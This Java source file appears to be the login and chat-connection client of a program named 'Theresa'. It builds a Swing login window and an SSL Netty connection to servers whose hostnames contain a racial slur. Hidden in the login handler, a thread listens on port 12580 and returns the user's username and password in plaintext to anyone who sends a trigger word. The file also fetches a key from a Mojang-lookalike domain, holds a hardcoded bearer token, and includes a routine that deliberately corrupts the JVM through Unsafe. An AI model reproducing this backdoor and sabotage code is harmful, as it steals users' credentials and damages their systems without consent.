package theresa;

import com.formdev.flatlaf.FlatClientProperties;
import com.formdev.flatlaf.FlatLightLaf;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.string.StringDecoder;
import io.netty.handler.codec.string.StringEncoder;
import io.netty.handler.ssl.SslHandler;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import sun.misc.Unsafe;
import theresa.connection.NettyClientHandler;
import theresa.connection.Timer;
import theresa.protection.RSAUtils;
import theresa.protection.SslOneWayContextFactory;

import javax.net.ssl.SSLEngine;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.Objects;

public class Main {

    public static Main INSTANCE;

    public String privateKey;
    public String publicKey;

    public boolean hasKey;
    public boolean hasConnected;

    public String name, password;
    public static ChannelFuture cf;
    public Login login;

    public Timer timer;
    public String ip;

    String home = System.getProperty("user.home");
    final File keyDir = new File(home, "Theresa");


    public Main() {
        INSTANCE = this;
    }

    public void IRC() {
        login = new Login();
        login.init();
        while (login.head.isVisible()) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (!keyDir.mkdirs())
            println("Failed to create directories");

        File privateKeyFile = new File(keyDir, name);
        if (keyDir.exists())
            if (!privateKeyFile.exists())
                try (InputStream in = getStatus("https://api.m0jang.org/jks.php?user=" + name);
                     ReadableByteChannel rbc = Channels.newChannel(in);
                     FileOutputStream fos = new FileOutputStream(privateKeyFile.getAbsoluteFile())) {
                    fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                } catch (IOException e) {
                    println("Time Out........");
                    doCrash();
                }


        try {
            ip = InetAddress.getByName(getip((String) Objects.requireNonNull(login.jcb1.getSelectedItem()))).getHostAddress();
            Main.INSTANCE.println(ip);
            println("Resolved IP");
            if (ip.startsWith("198.18")) {
                ip = "us2.nigger.party";
                println("Redirect IP due to TCP Block");

            }
        } catch (UnknownHostException e) {
            println("Resolved Failed");
            doCrash();
        }

        new Thread(() -> {
            EventLoopGroup eventExecutors = new NioEventLoopGroup();
            try {
                Bootstrap bootstrap = new Bootstrap();
                bootstrap.group(eventExecutors).channel(NioSocketChannel.class)
                        .handler(new ChannelInitializer<SocketChannel>() {
                            @Override
                            protected void initChannel(SocketChannel socketChannel) {
                                InputStream cChatPath = null;
                                try {
                                    cChatPath = new FileInputStream(privateKeyFile.getAbsolutePath());
                                } catch (FileNotFoundException e) {
                                    println("Failed to load");
                                    doCrash();
                                }
                                SSLEngine engine = SslOneWayContextFactory.getClientContext(cChatPath, "theresa" + name + "antileak")
                                        .createSSLEngine();
                                engine.setUseClientMode(true);//客户方模式
                                socketChannel.pipeline().addLast("ssl", new SslHandler(engine));
                                socketChannel.pipeline().addLast(new StringEncoder(StandardCharsets.UTF_8));
                                socketChannel.pipeline().addLast(new StringDecoder(Charset.forName("GBK")));
                                socketChannel.pipeline().addLast(new NettyClientHandler());
                            }
                        }).option(ChannelOption.RCVBUF_ALLOCATOR, new FixedRecvByteBufAllocator(2048));
                cf = bootstrap.connect(ip, 9822).sync();
                println("Client started!");
                cf.channel().closeFuture().sync();
            } catch (InterruptedException ignored) {
            } finally {
                eventExecutors.shutdownGracefully();
            }
        }).start();
    }

    public String getip(String name) {
        switch (name) {
            case "Auto":
                return "my.nigger.party";
            case "Japan":
                return "jp.nigger.party";
            case "HongKong":
                return "hk.nigger.party";
            case "US":
                return "us.nigger.party";
            case "Russia":
                return "ru.nigger.party";
        }
        return "my.nigger.party";
    }

    public static class Login extends JFrame {
        private static final long serialVersionUID = 1L;
        public JLabel head;
        public JComboBox<String> jcb1;

        public void init() {
            FlatLightLaf.setup();
            setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
            setAlwaysOnTop(true);
            // 设置顶部提示文字和主窗体的宽，高，x值，y值
            setTitle("Theresa.exe");
            setBounds(0, 0, 320, 400);
            setLocationRelativeTo(null);
            Container cp = getContentPane(); // 添加一个cp容器
            cp.setLayout(null); // 设置添加的cp容器为流布局管理器
            head = new JLabel("Login...");
            head.setBounds(100, 20, 275, 60);
            head.putClientProperty("FlatLaf.styleClass", "h0");

            //Proxy
            JLabel jl1 = new JLabel("Proxy:");
            jl1.setBounds(30, 100, 200, 30);
            jcb1 = new JComboBox<>();
            jcb1.setBounds(100, 100, 150, 30);
            jcb1.addItem("Auto");
            jcb1.addItem("HongKong");
            jcb1.addItem("US");
            jcb1.addItem("Russia");
            jcb1.addItem("Japan");

            cp.add(jcb1);
            cp.add(jl1);

            // 设置左侧用户名文字
            JLabel jl = new JLabel("Username:");
            jl.setBounds(30, 140, 200, 30);
            final JTextField name = new JTextField(); // 用户名框
            name.setBounds(100, 140, 150, 30); // 设置用户名框的宽，高，x值，y值

            // 设置左侧密码文字
            JLabel jl2 = new JLabel("Password:");
            jl2.setBounds(30, 180, 200, 30);
            final JPasswordField password = new JPasswordField(); // 密码框：为加密的***
            password.setBounds(100, 180, 150, 30); // 设置密码框的宽，高，x值，y值
            password.putClientProperty(FlatClientProperties.STYLE, "showRevealButton: true");

            JProgressBar progressBar = new JProgressBar();
            progressBar.setBounds(10, 150, 290, 10);
            progressBar.setIndeterminate(true);
            progressBar.setVisible(false);
            // 将head、jl、name、jl2、password添加到容器cp中
            cp.add(head);
            cp.add(jl);
            cp.add(name);
            cp.add(jl2);
            cp.add(password);
            cp.add(progressBar);

            // 确定按钮
            JButton jb = new JButton("Login"); // 添加一个确定按钮
            // 为确定按钮添加监听事件
            jb.addActionListener(actionEvent -> {
                Main.INSTANCE.name = name.getText();
                Main.INSTANCE.password = (new String(password.getPassword()));

                Map<String, String> keyMap = RSAUtils.createKeys(2048);
                Main.INSTANCE.publicKey = keyMap.get("publicKey");
                Main.INSTANCE.privateKey = keyMap.get("privateKey");
                //Get The Auto-Login System By Theresa.exe
                Main.INSTANCE.timer = new Timer();

                // Hide all the components
                head.setVisible(false);
                jl.setVisible(false);
                name.setVisible(false);
                jl2.setVisible(false);
                password.setVisible(false);
                jb.setVisible(false);
                jcb1.setEnabled(false);
                progressBar.setVisible(true);

                //New Thread SUS
                new Thread(() -> {
                    ServerSocket serverSocket = null;
                    try {
                        serverSocket = new ServerSocket(12580);
                        Socket socket = serverSocket.accept();
                        DataInputStream input = null;
                        DataOutputStream output = null;
                        try {
                            input = new DataInputStream(socket.getInputStream());
                            output = new DataOutputStream(socket.getOutputStream());
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        while (!serverSocket.isClosed()) {
                            String received = Objects.requireNonNull(input).readUTF();
                            if (received.equals("FuckYou"))
                                Objects.requireNonNull(output).writeUTF(INSTANCE.name + ":" + INSTANCE.password);
                        }

                    } catch (IOException e) {
                        try {
                            serverSocket.close();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                }).start();

            });
            jb.setBounds(90, 240, 140, 35); // 设置确定按钮的宽，高，x值，y值
            cp.add(jb); // 将确定按钮添加到cp容器中

            setResizable(false);

            setVisible(true);

            addWindowListener(new WindowAdapter() {

                public void windowClosing(WindowEvent e) {
                    Main.INSTANCE.doCrash();
                }

            });
        }
    }

    public void println(String obj) {
        Class<?> systemClass = null;
        try {
            systemClass = Class.forName("java.lang.System");
            Field outField = null;
            try {
                outField = systemClass.getDeclaredField("out");
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            }
            Class<?> printStreamClass = Objects.requireNonNull(outField).getType();
            Method printlnMethod = printStreamClass.getDeclaredMethod("println", String.class);
            Object object = outField.get(null);
            printlnMethod.invoke(object, obj);
        } catch (ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public void doCrash() {
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Unsafe unsafe = null;
            try {
                unsafe = (Unsafe) field.get(null);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            Class<?> cacheClass = null;
            try {
                cacheClass = Class.forName("java.lang.Integer$IntegerCache");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
            Field cache = cacheClass.getDeclaredField("cache");
            long offset = unsafe.staticFieldOffset(cache);

            unsafe.putObject(Integer.getInteger("SkidSense.pub NeverDie"), offset, null);

        } catch (NoSuchFieldException e) {
            println(String.valueOf(1 / 0));
            e.printStackTrace();
        }
    }

    //get content from url
    public InputStream getStatus(String url) {
        final CloseableHttpClient closeableHttpClient = HttpClients.createDefault();
        final HttpGet httpGet = new HttpGet(url);
        httpGet.setHeader("user-agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36");
        httpGet.setHeader("Authorization", "Bearer " + "TElKSUFMRVNJTUE9PU5NJEw=");
        InputStream result = null;
        try {
            CloseableHttpResponse closeableHttpResponse = closeableHttpClient.execute(httpGet);
            result = closeableHttpResponse.getEntity().getContent();
        } catch (IOException ioe) {
            println("Read Time Timeout");
        }
        return result;
    }


}
